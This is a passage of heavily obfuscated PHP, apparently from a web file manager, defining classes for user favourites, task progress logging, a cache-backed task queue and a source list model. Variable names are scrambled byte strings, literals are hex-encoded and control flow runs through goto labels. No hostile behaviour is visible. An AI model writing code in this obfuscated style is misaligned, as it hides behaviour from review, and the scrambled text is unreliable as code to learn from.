$‡Ä×šèÂ, $ê––®¨É); } public function add($ÂŸÖõ‚) { $¤ğäáŞà =& $_SERVER[äô®•½Â]; $¸ŠşšÙ± = $this->findByName($ÂŸÖõ‚[$¤ğäáŞà[32]]); if ($¸ŠşšÙ±) { return !1; } $ÂŸÖõ‚[$¤ğäáŞà[1727]] = 0; $ÂŸÖõ‚[$¤ğäáŞà[2001]] = $this->getSort(); return parent::insert($ÂŸÖõ‚); } private function getSort() { $Û•ò÷ÂÌ =& $_SERVER[äô®•½Â]; $Êµ¤èáÀ = parent::listData(); $š¦úİ¨á = array_to_keyvalue($Êµ¤èáÀ, $Û•ò÷ÂÌ[12], $Û•ò÷ÂÌ[2001]); return empty($š¦úİ¨á) ? 0 : max($š¦úİ¨á) + 1; } public function update($Õ´„×‘, $´á¸ÂÃ€) { $Öå°ØÍ =& $_SERVER[äô®•½Â]; $±ó˜÷½Ğ = $this->listData($Õ´„×‘); $øËÁ­±Å = $this->findByName($´á¸ÂÃ€[$Öå°ØÍ[32]]); if (!$±ó˜÷½Ğ || $øËÁ­±Å && $øËÁ­±Å[$Öå°ØÍ[486]] != $±ó˜÷½Ğ[$Öå°ØÍ[486]]) { return !1; } return parent::update($Õ´„×‘, $´á¸ÂÃ€); } public function remove($¬§¨Õ¥Ö, $§±ğÂú¿ = false) { $É¯Á¨—Ô =& $_SERVER[äô®•½Â]; $‰­‡®îñ = $this->listData($¬§¨Õ¥Ö); if (!$‰­‡®îñ) { return; } if (!$§±ğÂú¿ && $‰­‡®îñ[$É¯Á¨—Ô[192]] == $É¯Á¨—Ô[91]) { return !1; } return parent::remove($¬§¨Õ¥Ö); } public function enable($•™éÇ–, $õ¿˜âÓÉ) { return $this->update($•™éÇ–, array($_SERVER[äô®•½Â][2460] => $õ¿˜âÓÉ)); } public function run($“èã—‚•) { return $this->update($“èã—‚•, array($_SERVER[äô®•½Â][2472] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\x66\141\166"; protected function cacheFunctionAlias($èÀÕ¥ƒ ) { $ÌáÃÀëä =& $_SERVER[äô®•½Â]; return array($ÌáÃÀëä[2093] => array(USER_ID, $ÌáÃÀëä[2473])); } protected function listData() { $ûî‰ß„ğ =& $_SERVER[äô®•½Â]; $¿ìÕª®¸ = array($ûî‰ß„ğ[1768] => USER_ID, $ûî‰ß„ğ[570] => 0); $Ú¤ªâ¨Î = $ûî‰ß„ğ[2474]; $Ä’ùş„© = $this->field($Ú¤ªâ¨Î)->where($¿ìÕª®¸)->order($ûî‰ß„ğ[2475])->select(); return $Ä’ùş„© ? $Ä’ùş„© : array(); } protected function resetCache() { } protected function listView() { $íÈûÒ¼Ÿ =& $_SERVER[äô®•½Â]; $ÖïÄ¤‡Í = $this->listData(); $Ÿ©ŸıÀ© = array_filter_by_field($ÖïÄ¤‡Í, $íÈûÒ¼Ÿ[33], $íÈûÒ¼Ÿ[501]); $ÈÌ««™º = array_to_keyvalue($Ÿ©ŸıÀ©, $íÈûÒ¼Ÿ[12], $íÈûÒ¼Ÿ[87]); if (!$ÈÌ««™º) { return $ÖïÄ¤‡Í; } $²äŠË›‰ = 2000; $ü¸Ÿé·¯ = array($íÈûÒ¼Ÿ[502] => array($íÈûÒ¼Ÿ[503], $ÈÌ««™º)); $’ëˆ¶™À = Model($íÈûÒ¼Ÿ[896])->listSource($ü¸Ÿé·¯, $²äŠË›‰); $’ëˆ¶™À = array_merge($’ëˆ¶™À[$íÈûÒ¼Ÿ[86]], $’ëˆ¶™À[$íÈûÒ¼Ÿ[85]]); $’ëˆ¶™À = array_to_keyvalue($’ëˆ¶™À, $íÈûÒ¼Ÿ[194]); foreach ($ÖïÄ¤‡Í as $æ›îâ§÷ => $–ßö§®) { $Ùæ ‚Éë = $’ëˆ¶™À[$–ßö§®[$íÈûÒ¼Ÿ[87]]]; $Ùæ ‚Éë = $Ùæ ‚Éë ? $Ùæ ‚Éë : array(); $ÖïÄ¤‡Í[$æ›îâ§÷] = array_merge($Ùæ ‚Éë, $–ßö§®); } return $ÖïÄ¤‡Í; } protected function addFav($«—µÁÑè, $®Î¾ºĞ = '', $³ïÚ„Ú• = "\x73\x6f\x75\162\x63\x65") { $â®÷Õ‰¯ =& $_SERVER[äô®•½Â]; $’Îæ±«± = array($â®÷Õ‰¯[1768] => USER_ID, $â®÷Õ‰¯[570] => 0, $â®÷Õ‰¯[507] => $³ïÚ„Ú•, $â®÷Õ‰¯[506] => $«—µÁÑè); if ($this->where($’Îæ±«±)->find()) { return !1; } $’Îæ±«± = array($â®÷Õ‰¯[1768] => USER_ID, $â®÷Õ‰¯[570] => 0); $ìƒÛ¬¤© = $this->where($’Îæ±«±)->max($â®÷Õ‰¯[2001]); if (!$ìƒÛ¬¤©) { $ìƒÛ¬¤© = 0; } if (!$®Î¾ºĞ && $³ïÚ„Ú• == $â®÷Õ‰¯[501]) { $Ôõ†«œ™ = Model($â®÷Õ‰¯[1426])->where(array($â®÷Õ‰¯[502] => $«—µÁÑè))->find(); if (!$Ôõ†«œ™) { return !1; } $®Î¾ºĞ = $Ôõ†«œ™[$â®÷Õ‰¯[32]]; } $®Î¾ºĞ = $this->getAutoName($®Î¾ºĞ); $·÷ğÉ¼Á = array($â®÷Õ‰¯[1768] => USER_ID, $â®÷Õ‰¯[570] => 0, $â®÷Õ‰¯[505] => $®Î¾ºĞ, $â®÷Õ‰¯[506] => $«—µÁÑè, $â®÷Õ‰¯[507] => $³ïÚ„Ú•, $â®÷Õ‰¯[1981] => $ìƒÛ¬¤© + 1); return $this->add($·÷ğÉ¼Á); } protected function remove($µÉ€·ßö) { $‡ÅÔîİÏ =& $_SERVER[äô®•½Â]; $äÑßœãÅ = array($‡ÅÔîİÏ[1768] => USER_ID, $‡ÅÔîİÏ[504] => $µÉ€·ßö); return $this->where($äÑßœãÅ)->delete(); } protected function removeByName($÷Ì¡ÓÕ) { $ØäÆòŠ» =& $_SERVER[äô®•½Â]; $Üßäé¸ = array($ØäÆòŠ»[1768] => USER_ID, $ØäÆòŠ»[505] => $÷Ì¡ÓÕ, $ØäÆòŠ»[570] => 0); return $this->where($Üßäé¸)->delete(); } protected function rename($£ú…°Õ˜, $Ä•ÇÏëğ) { $¢ÂÀí˜« =& $_SERVER[äô®•½Â]; if ($£ú…°Õ˜ == $Ä•ÇÏëğ) { return !1; } $Á‘İºú‹ = $this->getAutoName($Ä•ÇÏëğ); if ($Ä•ÇÏëğ != $Á‘İºú‹) { return !1; } $ßËüÏí = array($¢ÂÀí˜«[1768] => USER_ID, $¢ÂÀí˜«[570] => 0, $¢ÂÀí˜«[32] => $£ú…°Õ˜); return $this->where($ßËüÏí)->save(array($¢ÂÀí˜«[32] => $Ä•ÇÏëğ)); } protected function resetSort($Í¦»˜à÷) { $ã ¶Ëœ² =& $_SERVER[äô®•½Â]; $Í¦»˜à÷ = is_array($Í¦»˜à÷) ? $Í¦»˜à÷ : array(); $´ıöáª = array($ã ¶Ëœ²[1768] => USER_ID); for ($ØÑÈäŒ¸ = 0; $ØÑÈäŒ¸ < count($Í¦»˜à÷); $ØÑÈäŒ¸++) { $´ıöáª[$ã ¶Ëœ²[504]] = $Í¦»˜à÷[$ØÑÈäŒ¸]; $this->where($´ıöáª)->save(array($ã ¶Ëœ²[1981] => $ØÑÈäŒ¸ + 1)); } return !0; } protected function moveTop($”€ªå¢) { $ĞŠšèÖè =& $_SERVER[äô®•½Â]; $¶÷ÇËÕ = array($ĞŠšèÖè[1768] => USER_ID, $ĞŠšèÖè[570] => 0); $³»°Î¼Ÿ = $this->where($¶÷ÇËÕ)->where(array($ĞŠšèÖè[32] => $”€ªå¢))->find(); if (!$³»°Î¼Ÿ) { return; } $ŸĞ™ûÚƒ = $this->field($ĞŠšèÖè[486])->where($¶÷ÇËÕ)->order($ĞŠšèÖè[2475])->select(); $ŸĞ™ûÚƒ = array_to_keyvalue($ŸĞ™ûÚƒ, $ĞŠšèÖè[12], $ĞŠšèÖè[486]); $‚ı÷ò‡ = $ŸĞ™ûÚƒ; $ŸĞ™ûÚƒ = array_remove_value($ŸĞ™ûÚƒ, $³»°Î¼Ÿ[$ĞŠšèÖè[486]]); array_unshift($ŸĞ™ûÚƒ, $³»°Î¼Ÿ[$ĞŠšèÖè[486]]); return $this->resetSort($ŸĞ™ûÚƒ); } protected function moveBottom($„Òá„±) { $äÄÔˆ›“ =& $_SERVER[äô®•½Â]; $ÚŠ„Î· = array($äÄÔˆ›“[1768] => USER_ID, $äÄÔˆ›“[570] => 0); $¡£‹¸” = $this->where($ÚŠ„Î·)->max($äÄÔˆ›“[2001]); $üéŸ‡˜÷ = array($äÄÔˆ›“[2001] => $¡£‹¸” + 1); return $this->where($ÚŠ„Î·)->where(array($äÄÔˆ›“[32] => $„Òá„±))->save($üéŸ‡˜÷); } private function getAutoName($À¬İ°…è) { $ò¼¡ÀÅş =& $_SERVER[äô®•½Â]; $Ãı–Ñá¾ = array($ò¼¡ÀÅş[1768] => USER_ID, $ò¼¡ÀÅş[570] => 0); $Ôøİíâë = $this->field($ò¼¡ÀÅş[32])->where($Ãı–Ñá¾)->select(); $Ôøİíâë = array_to_keyvalue($Ôøİíâë, $ò¼¡ÀÅş[12], $ò¼¡ÀÅş[32]); if (!$Ôøİíâë || !in_array($À¬İ°…è, $Ôøİíâë)) { return $À¬İ°…è; } for ($„Æ‚ÁÚÚ = 0; $„Æ‚ÁÚÚ < count($Ôøİíâë); $„Æ‚ÁÚÚ++) { if (!in_array($À¬İ°…è . "\50{$„Æ‚ÁÚÚ}\51", $Ôøİíâë)) { return $À¬İ°…è . "\x28{$„Æ‚ÁÚÚ}\x29"; } } return $À¬İ°…è . "\x28{$„Æ‚ÁÚÚ}\x29"; } } goto aÑ»Ä™§ˆë; d©¿öŠ”ÊŒ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($÷æ©Üàß, $ò¾í„“á = '', $åü—½¶¢ = 0, $£ñÈåâ¥ = '') { $œÁ×óÚÈ =& $_SERVER[äô®•½Â]; $£ñÈåâ¥ = $£ñÈåâ¥ ? $£ñÈåâ¥ : ($ò¾í„“á ? $ò¾í„“á : $÷æ©Üàß); $áœ²€§é = new Task($÷æ©Üàß, $ò¾í„“á, $åü—½¶¢, $£ñÈåâ¥); $GLOBALS[$œÁ×óÚÈ[1861] . $÷æ©Üàß] = new TaskLog($œÁ×óÚÈ[1760], $áœ²€§é, $£ñÈåâ¥); return $áœ²€§é; } public function __construct($ŞòãùŒì = '', $Á§­»Ğë = '', $ªì¥¼úô = '') { $İ£«„Í =& $_SERVER[äô®•½Â]; if (!$ŞòãùŒì) { $ŞòãùŒì = $İ£«„Í[1760]; } $ÍÉåäÄì = $ŞòãùŒì . $İ£«„Í[473] . rand_string(10); if (!$ªì¥¼úô) { $ªì¥¼úô = $ŞòãùŒì . $İ£«„Í[53] . $ªì¥¼úô; } switch ($ŞòãùŒì) { case $İ£«„Í[1760]: if (!$Á§­»Ğë || !$Á§­»Ğë->task) { return echoLog($ŞòãùŒì . $İ£«„Í[1862]); } $ÖŠïÖò = $Á§­»Ğë; $ÍÉåäÄì = $ÖŠïÖò->task[$İ£«„Í[486]]; $ŞòãùŒì = $ÖŠïÖò->task[$İ£«„Í[486]]; if (!$ÖŠïÖò->task[$İ£«„Í[1664]]) { $ÖŠïÖò->task[$İ£«„Í[1664]] = $ªì¥¼úô ? $ªì¥¼úô : $ŞòãùŒì; } break; case $İ£«„Í[1863]: if (!$Á§­»Ğë) { return echoLog($ŞòãùŒì . $İ£«„Í[1864]); } $”Ùéñ£ş = is_string($Á§­»Ğë) ? array($Á§­»Ğë) : $Á§­»Ğë; $ÖŠïÖò = new TaskFileTransfer($ÍÉåäÄì, $ŞòãùŒì, 0, $ªì¥¼úô ? $ªì¥¼úô : $”Ùéñ£ş[0]); foreach ($”Ùéñ£ş as $ßºæäìü) { $ÖŠïÖò->addPath($ßºæäìü); } break; case $İ£«„Í[399]: if (!$Á§­»Ğë) { return echoLog($ŞòãùŒì . $İ£«„Í[1864]); } $”Ùéñ£ş = is_string($Á§­»Ğë) ? array($Á§­»Ğë) : $Á§­»Ğë; $ÖŠïÖò = new TaskZip($ÍÉåäÄì, $ŞòãùŒì, 0, $ªì¥¼úô ? $ªì¥¼úô : $”Ùéñ£ş[0]); foreach ($”Ùéñ£ş as $ßºæäìü) { $ÖŠïÖò->addPath($ßºæäìü); } break; case $İ£«„Í[1297]: if (!$Á§­»Ğë) { return echoLog($ŞòãùŒì . $İ£«„Í[1864]); } $ÖŠïÖò = new TaskUnZip($ÍÉåäÄì, $ŞòãùŒì, 0, $ªì¥¼úô ? $ªì¥¼úô : $Á§­»Ğë); if ($Á§­»Ğë) { $ÖŠïÖò->addFile($Á§­»Ğë); } break; case $İ£«„Í[152]: $ÖŠïÖò = new TaskHttp($ÍÉåäÄì, $ŞòãùŒì); break; default: return; break; } $this->task = $ÖŠïÖò; $this->taskID = $ÍÉåäÄì; Hook::bind($İ£«„Í[1798], array($this, $İ£«„Í[1865])); Hook::bind($İ£«„Í[1800], array($this, $İ£«„Í[1866])); Hook::bind($İ£«„Í[1794], array($this, $İ£«„Í[1867])); echoLog($İ£«„Í[1868] . $ÖŠïÖò->task[$İ£«„Í[1664]]); } public function __destruct() { $this->end(); } public function end($è»Øøñ = '') { $±®Ïİ =& $_SERVER[äô®•½Â]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($è»Øøñ); $this->task = !1; $this->taskID = !1; Hook::unbind($±®Ïİ[1798], array($this, $±®Ïİ[1865])); Hook::unbind($±®Ïİ[1800], array($this, $±®Ïİ[1866])); Hook::unbind($±®Ïİ[1794], array($this, $±®Ïİ[1867])); } public function taskUpdate($Ü¸Ÿò¸Ö) { $ª„÷è =& $_SERVER[äô®•½Â]; if (!$Ü¸Ÿò¸Ö || $this->taskID != $Ü¸Ÿò¸Ö[$ª„÷è[486]]) { return; } $‡»ÚØÔğ = 20; $Ï˜µ×î = intval($Ü¸Ÿò¸Ö[$ª„÷è[1779]] * $‡»ÚØÔğ); $º—Õ“÷ì = $ª„÷è[176] . str_repeat($ª„÷è[517], $Ï˜µ×î) . $ª„÷è[1086] . str_repeat($ª„÷è[53], $‡»ÚØÔğ - $Ï˜µ×î) . $ª„÷è[178]; $Î›÷¨‰£ = $º—Õ“÷ì . sprintf($ª„÷è[1869], $Ü¸Ÿò¸Ö[$ª„÷è[1779]] * 100) . $ª„÷è[1870]; $®”‘îß = $Î›÷¨‰£ . $Ü¸Ÿò¸Ö[$ª„÷è[1778]] . $ª„÷è[8] . $Ü¸Ÿò¸Ö[$ª„÷è[1135]] . LNG($ª„÷è[1871]); $†§Ú˜šå = $ª„÷è[12]; if ($Ü¸Ÿò¸Ö[$ª„÷è[1855]]) { $®”‘îß = $Î›÷¨‰£ . size_format($Ü¸Ÿò¸Ö[$ª„÷è[1778]]) . $ª„÷è[8] . size_format($Ü¸Ÿò¸Ö[$ª„÷è[1135]]); $†§Ú˜šå = size_format($Ü¸Ÿò¸Ö[$ª„÷è[1780]]) . $ª„÷è[1872]; } if ($Ü¸Ÿò¸Ö[$ª„÷è[1137]]) { $Ü¸Ÿò¸Ö[$ª„÷è[1829]] = $Ü¸Ÿò¸Ö[$ª„÷è[1137]] . $ª„÷è[53] . $Ü¸Ÿò¸Ö[$ª„÷è[1829]]; } if ($Ü¸Ÿò¸Ö[$ª„÷è[1829]]) { $ÖşºŞÆŠ = $ª„÷è[12]; if ($Ü¸Ÿò¸Ö[$ª„÷è[1831]]) { $ÖşºŞÆŠ = $ª„÷è[50] . size_format($Ü¸Ÿò¸Ö[$ª„÷è[1832]]) . $ª„÷è[8] . size_format($Ü¸Ÿò¸Ö[$ª„÷è[1831]]); } $†§Ú˜šå .= $Ü¸Ÿò¸Ö[$ª„÷è[1829]] . $ÖşºŞÆŠ; } if ($Ü¸Ÿò¸Ö[$ª„÷è[829]] && !$Ü¸Ÿò¸Ö[$ª„÷è[1831]]) { $†§Ú˜šå .= $ª„÷è[53] . size_format($Ü¸Ÿò¸Ö[$ª„÷è[1836]]) . $ª„÷è[8] . size_format($Ü¸Ÿò¸Ö[$ª„÷è[829]]); } echoLog($®”‘îß . $ª„÷è[53] . $†§Ú˜šå, !0); } public function taskEnd($Ñ’ ³Á—) { $ó“ãÀë =& $_SERVER[äô®•½Â]; if (!$Ñ’ ³Á— || $this->taskID != $Ñ’ ³Á—[$ó“ãÀë[486]]) { return; } $¿Ú¦Õƒ× = $Ñ’ ³Á— ? LNG($ó“ãÀë[1873]) . $ó“ãÀë[4] . $Ñ’ ³Á—[$ó“ãÀë[1778]] . $ó“ãÀë[8] . $Ñ’ ³Á—[$ó“ãÀë[1135]] . LNG($ó“ãÀë[1871]) . $ó“ãÀë[74] : $ó“ãÀë[12]; echoLog($ó“ãÀë[1874] . $Ñ’ ³Á—[$ó“ãÀë[1664]] . ($Ñ’ ³Á—[$ó“ãÀë[537]] ? $ó“ãÀë[74] . $Ñ’ ³Á—[$ó“ãÀë[537]] : $ó“ãÀë[12]) . $ó“ãÀë[74] . $¿Ú¦Õƒ× . $ó“ãÀë[1875] . sprintf($ó“ãÀë[923], timeFloat() - $Ñ’ ³Á—[$ó“ãÀë[1781]]) . $ó“ãÀë[1793]); $this->end(); } public function taskKill($éğßĞˆ) { $ı˜¶˜úš =& $_SERVER[äô®•½Â]; if (!$éğßĞˆ || $this->taskID != $éğßĞˆ[$ı˜¶˜úš[486]]) { return; } echoLog($ı˜¶˜úš[1876] . $éğßĞˆ[$ı˜¶˜úš[1664]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\x61\163\x6b\121\x75\x65\165\145\114\145\x6e\147\x74\x68"; const QUEUE_DATA = "\164\x61\x73\x6b\121\x75\145\x75\145\x44\x61\x74\141"; const QUEUE_TIME = "\164\141\163\x6b\121\x75\145\x75\x65\114\141\163\x74\122\x75\x6e"; const QUEUE_THREAD = "\x74\x61\x73\153\x51\165\x65\165\145\124\150\x72\x65\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($Õçø—ÁŠ, $Ò”Àš»± = array(), $¨Ñ¸ÒÓá = '', $¿–û¤¯¯ = '') { $õçÛñ¹ =& $_SERVER[äô®•½Â]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¿–û¤¯¯ && array_find_by_field(self::$listData, $õçÛñ¹[97], $¿–û¤¯¯)) { return !0; } if ($¿–û¤¯¯ && array_find_by_field(self::$listDataAdd, $õçÛñ¹[97], $¿–û¤¯¯)) { return !0; } self::$listDataAdd[] = array($õçÛñ¹[353] => $Õçø—ÁŠ, $õçÛñ¹[1877] => $Ò”Àš»±, $õçÛñ¹[537] => $¨Ñ¸ÒÓá, $õçÛñ¹[97] => $¿–û¤¯¯); return !0; } public static function addSubmit() { $û¾òÆÆå =& $_SERVER[äô®•½Â]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($û¾òÆÆå[1878] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $û¾òÆÆå[12], $û¾òÆÆå[537])), $û¾òÆÆå[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ğÊ®Šã­, $ÊâŸ¼½ü = array(), $¼šü‚òĞ = '', $¾ï–¿îä = '') { $ú³òÒµÑ =& $_SERVER[äô®•½Â]; if (self::count() >= self::MAX_LENGTH) { return !1; } $êĞëâ’ = self::getAll(); if ($¾ï–¿îä && array_find_by_field($êĞëâ’, $ú³òÒµÑ[97], $¾ï–¿îä)) { return !0; } $êĞëâ’[] = array($ú³òÒµÑ[353] => $ğÊ®Šã­, $ú³òÒµÑ[1877] => $ÊâŸ¼½ü, $ú³òÒµÑ[537] => $¼šü‚òĞ, $ú³òÒµÑ[97] => $¾ï–¿îä); self::setAll($êĞëâ’); write_log($ú³òÒµÑ[1878] . $¼šü‚òĞ, $ú³òÒµÑ[198]); return !0; } public static function run() { $öÊÇ¸Òß =& $_SERVER[äô®•½Â]; $™Üœ‰ê” = self::getAll(); $µ¶²Œ“õ = array_shift($™Üœ‰ê”); if (!$µ¶²Œ“õ) { return !1; } self::setAll($™Üœ‰ê”); $Ïüï¾»Î = timeFloat(); $åá¼¦×º = $öÊÇ¸Òß[12]; try { $åá¼¦×º = Hook::apply($µ¶²Œ“õ[$öÊÇ¸Òß[353]], $µ¶²Œ“õ[$öÊÇ¸Òß[1877]]); } catch (Exception $ÒÕ€ö¹£) { write_log($ÒÕ€ö¹£, $öÊÇ¸Òß[1262]); } $ï¼Ÿ»ì = number_format(timeFloat() - $Ïüï¾»Î, 3) . $öÊÇ¸Òß[1793]; if ($åá¼¦×º && is_string($åá¼¦×º)) { $ï¼Ÿ»ì = $ï¼Ÿ»ì . $öÊÇ¸Òß[1879] . $åá¼¦×º; } write_log($öÊÇ¸Òß[1880] . $µ¶²Œ“õ[$öÊÇ¸Òß[537]] . $öÊÇ¸Òß[1881] . $ï¼Ÿ»ì, $öÊÇ¸Òß[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $££«·ê =& $_SERVER[äô®•½Â]; $—ß”×‚ = self::threadCount() + 1; if ($—ß”×‚ > 3 || !self::count()) { return; } write_log($££«·ê[1882] . $—ß”×‚, $££«·ê[198]); Cache::set(self::QUEUE_THREAD, $—ß”×‚, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($££«·ê[1883], $££«·ê[198]); } public static function getKey($‰ªÀíı×, $¨»ûÅı = "\151\156\164") { $éÆÁ™§ =& $_SERVER[äô®•½Â]; Cache::removeMemory($‰ªÀíı×); $œĞïÂë· = Cache::get($‰ªÀíı×); if ($¨»ûÅı == $éÆÁ™§[375]) { return $œĞïÂë· ? intval($œĞïÂë·) : 0; } if ($¨»ûÅı == $éÆÁ™§[1884]) { return is_array($œĞïÂë·) ? $œĞïÂë· : array(); } return $œĞïÂë·; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[äô®•½Â][1884]); } public static function setAll($ƒå£êŸÉ) { $¹ŸäÊÌ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ƒå£êŸÉ), $¹ŸäÊÌ); Cache::set(self::QUEUE_DATA, $ƒå£êŸÉ, $¹ŸäÊÌ); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ô—Ğã“Â, $¤ä”Ë¦ã = 5.0) { if (!$ô—Ğã“Â) { return; } $Ç¶àÅá˜ = Cache::get($ô—Ğã“Â); if (!$Ç¶àÅá˜ || timeFloat() - floatVal($Ç¶àÅá˜) >= $¤ä”Ë¦ã) { Cache::set($ô—Ğã“Â, timeFloat(), $¤ä”Ë¦ã * 10); return !0; } return !1; } public static function timeLimitCall($™½Ñ€–, $ÅÙ¿®ó†, $å¿‡­Âö, $ºâæÜ³ = 5.0) { $áşÄŠáØ =& $_SERVER[äô®•½Â]; if (!$™½Ñ€– || !$ÅÙ¿®ó†) { return; } self::$asyncAdd = !0; $é¿­ş¥­ = $áşÄŠáØ[1885]; $ô’ûúÍ‚ = Cache::get($é¿­ş¥­, !0); $œ¤–„¼Ê = array($áşÄŠáØ[1886] => timeFloat(), $áşÄŠáØ[1887] => timeFloat(), $áşÄŠáØ[353] => $ÅÙ¿®ó†, $áşÄŠáØ[1877] => $å¿‡­Âö, $áşÄŠáØ[1888] => $ºâæÜ³); if (is_array($ô’ûúÍ‚[$™½Ñ€–])) { if (timeFloat() - $ô’ûúÍ‚[$™½Ñ€–][$áşÄŠáØ[1886]] <= $œ¤–„¼Ê[$áşÄŠáØ[1888]] * 0.5) { return; } $œ¤–„¼Ê[$áşÄŠáØ[1887]] = $ô’ûúÍ‚[$™½Ñ€–][$áşÄŠáØ[1887]]; } $ô’ûúÍ‚[$™½Ñ€–] = $œ¤–„¼Ê; Cache::set($é¿­ş¥­, $ô’ûúÍ‚, 60); Cache::removeMemory($é¿­ş¥­); write_log($áşÄŠáØ[1889] . $™½Ñ€– . $áşÄŠáØ[74] . $ÅÙ¿®ó† . $áşÄŠáØ[1890] . ACTION, $áşÄŠáØ[198]); } public static function timeLimitCallLoop() { $ûãÛ™€ =& $_SERVER[äô®•½Â]; $šãÀ¤ÑÇ = array($ûãÛ™€[1891]); $ö¾–ÜÏ— = in_array(strtolower(ACTION), $šãÀ¤ÑÇ); if (!$ö¾–ÜÏ— && !self::$asyncAdd) { return; } $İ¢‰ĞÖ™ = $ûãÛ™€[1885]; $ÎÙÏé– = Cache::get($İ¢‰ĞÖ™, !0); if (!$ÎÙÏé– || count($ÎÙÏé–) <= 0) { return; } $ñõËñ©» = timeFloat(); $¤ÜóÖŞ¹ = array(); $‚Öç³µ´ = array(); foreach ($ÎÙÏé– as $ÑÇÈ—Û’ => $¿‹Ôşæ¨) { if ($ñõËñ©» - $¿‹Ôşæ¨[$ûãÛ™€[1887]] > $¿‹Ôşæ¨[$ûãÛ™€[1888]]) { $‚Öç³µ´[$ÑÇÈ—Û’] = $¿‹Ôşæ¨; continue; } $¤ÜóÖŞ¹[$ÑÇÈ—Û’] = $¿‹Ôşæ¨; } if (count($‚Öç³µ´) == 0) { return; } if (count($¤ÜóÖŞ¹) == 0) { Cache::remove($İ¢‰ĞÖ™); } else { Cache::set($İ¢‰ĞÖ™, $¤ÜóÖŞ¹, 60); } Cache::removeMemory($İ¢‰ĞÖ™); self::runArr($‚Öç³µ´); } public static function finished($‹µ¼Ô©, $×«—¸†—) { $šŸ––®· =& $_SERVER[äô®•½Â]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($šŸ––®·[353] => $‹µ¼Ô©, $šŸ––®·[1877] => $×«—¸†—); } private static function runArr($âú™˜«¬) { $ÌõğüŒ =& $_SERVER[äô®•½Â]; if (!$âú™˜«¬) { return; } foreach ($âú™˜«¬ as $Ò§”¯® => $ÒƒŸŸÉ€) { try { Hook::apply($ÒƒŸŸÉ€[$ÌõğüŒ[353]], $ÒƒŸŸÉ€[$ÌõğüŒ[1877]]); write_log($ÌõğüŒ[1892] . $Ò§”¯® . $ÌõğüŒ[74] . $ÒƒŸŸÉ€[$ÌõğüŒ[353]] . $ÌõğüŒ[1890] . ACTION, $ÌõğüŒ[198]); } catch (Exception $×ÚãË¦) { } } } public static function autoRun() { self::runArr(self::$syncTask); self::timeLimitCallLoop(); } } goto b¸à‹”Ìòì; A¥ñÅ“ØÏÈ: define($_SERVER[äô®•½Â][320], 3); define($_SERVER[äô®•½Â][321], 1); define($_SERVER[äô®•½Â][322], 0); goto cØ‰Ó——àÇ; c®áÃ£Œğ„: class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\162\x63\145"; protected $tableMeta = array("\x74\141\142\154\x65\116\x61\155\x65" => "\x69\x6f\137\163\157\165\x72\x63\x65\137\x6d\145\164\x61", "\x6d\145\x74\141\x46\x69\x65\154\144" => "\163\157\x75\162\x63\145\111\104"); protected $dataAuto = array(array("\x6d\x6f\144\151\x66\171\124\151\x6d\145", "\164\151\155\x65", "\x69\156\x73\145\162\x74", "\x66\x75\x6e\143\164\151\157\x6e"), array("\143\x72\145\x61\x74\145\x54\151\155\x65", "\164\x69\155\145", "\151\x6e\x73\145\162\x74", "\x66\165\x6e\x63\x74\151\x6f\x6e"), array("\166\x69\x65\x77\x54\151\155\145", "\164\x69\x6d\145", "\x69\156\163\x65\x72\x74", "\146\165\x6e\x63\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($úœ™ÁúÈ) { return $this->listSource(array($_SERVER[äô®•½Â][488] => $úœ™ÁúÈ)); } public function typeName($¡¦«É«¿) { static $ì–Ôàı = array(self::TYPE_SYSTEM => "\163\171\163\164\145\x6d", self::TYPE_USER => "\165\x73\x65\162", self::TYPE_GROUP => "\x67\162\157\x75\160"); return $ì–Ôàı[$¡¦«É«¿ . $_SERVER[äô®•½Â][12]]; } public function sourceListInfo($ÖÑÂ¯İ, $åØ——·á = false) { $‰ÇÉ¬Ûò =& $_SERVER[äô®•½Â]; $ÖÑÂ¯İ = $ÖÑÂ¯İ ? $ÖÑÂ¯İ : array(); $ÖÑÂ¯İ = array_filter(array_unique($ÖÑÂ¯İ)); if (!$ÖÑÂ¯İ) { return array(); } $Ú¦Ä¤Çƒ = $this->where(array($‰ÇÉ¬Ûò[194] => array($‰ÇÉ¬Ûò[7], $ÖÑÂ¯İ)))->select(); $this->_listDataApply($Ú¦Ä¤Çƒ, $åØ——·á); return array_to_keyvalue($Ú¦Ä¤Çƒ, $‰ÇÉ¬Ûò[194]); } public function pathInfoFilter(&$õ²ßÓ¯Š) { $½å½ó¬ö =& $_SERVER[äô®•½Â]; static $‚ãêÂ¨÷ = false; static $úÈï°Šö = false; static $İ·¹¯«Œ = false; if (!$‚ãêÂ¨÷) { $¡Ÿµ‹À½ = $½å½ó¬ö[489]; 